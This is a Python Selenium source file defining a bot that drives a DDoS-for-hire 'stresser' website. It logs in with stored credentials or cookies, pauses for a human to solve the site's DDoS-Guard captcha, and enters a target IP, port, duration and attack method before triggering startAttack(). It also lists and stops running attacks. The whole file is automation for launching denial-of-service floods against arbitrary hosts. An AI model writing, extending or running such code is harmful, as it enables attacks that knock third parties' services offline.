from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import *

import os
import logging
import requests
import time
import traceback

from utils.pages import Pages
from utils.execute_js import ExecuteJs

class Bot(Pages, ExecuteJs):
    def __init__(self, driver: webdriver.Chrome, info: dict, main_logger: logging) -> None:
        self.main_logger = main_logger
        self.driver = driver
        self.info = info
        self.driver.get("https://www.stressthem.se")
        self.driver.implicitly_wait(0.5)

    def find_element_by_locator(self, locator) -> WebDriverWait:
        return WebDriverWait(self.driver, 10).until(EC.presence_of_element_located(locator))

    def get_cookies(self) -> dict:
        cookies = self.driver.get_cookies()
        return {cookie['name']: cookie['value'] for cookie in cookies}

    def restart_session(self):
        self.driver.execute_script("location.reload();")

    def close_button(self):
        self.close_button= self.driver.find_element(By.CLASS_NAME, "close")
        self.close_button.click()

    def login_form(self) -> any:
        try:
            self.login_page()
            if EC.title_is("DDoS-Guard"):
                print("Debes de solucionar el captcha para seguir si tiene modo con --headless cámbialo")
                WebDriverWait(self.driver, 100).until(EC.title_is("Login Portal"))

            username_form = self.driver.find_element(By.ID, "username")
            username_form.send_keys(self.info["username"])

            password_form = self.driver.find_element(By.ID, "password")
            password_form.send_keys(self.info["password"])

            self.driver.implicitly_wait(0.5)
            self.driver.find_element(By.CLASS_NAME, "btn").click()
        except Exception as e:
            self.main_logger.error(traceback.format_exc())
            raise e

    def login_cookies(self) -> any:
        for cookie in self.info["cookies"]:
            self.driver.add_cookie(cookie)

    def start_attack(self, ip: str, port: int, time: int, method: str):
        self.ip_form = self.driver.find_element(By.ID, "host")
        self.ip_form.send_keys(ip)

        self.port_form = self.driver.find_element(By.ID, "port")
        self.port_form.send_keys(port)

        self.time_form = self.driver.find_element(By.ID, "time")
        self.time_form.send_keys(time)

        self.method_form = Select(self.driver.find_element(By.ID, "method"))
        self.method_form.select_by_value(method)

        self.driver.implicitly_wait(1.0)

        self.driver.execute_script("startAttack();")
        self.driver.implicitly_wait(1.0)

        try:
            self.restart_session()
        except:
            self.main_logger.error(traceback.format_exc())
    def get_running_attacks(self):
        return self.driver.execute_script(self.run_js("getAttacks.js"))

    def stop_attack(self, id: int):
        try:
            self.driver.execute_script("stopAttack();", id)
            time.sleep(0.2)
        except:
            print(traceback.print_exception())
            self.main_logger.error(traceback.format_exc())
    def get_attacks(self):
        return self.driver.execute_script("getAttacks()")

    def driver_quit(self) -> any:
        try:
            self.driver.execute_script("stopAllAttack()")
        except:
            pass
        self.driver.quit()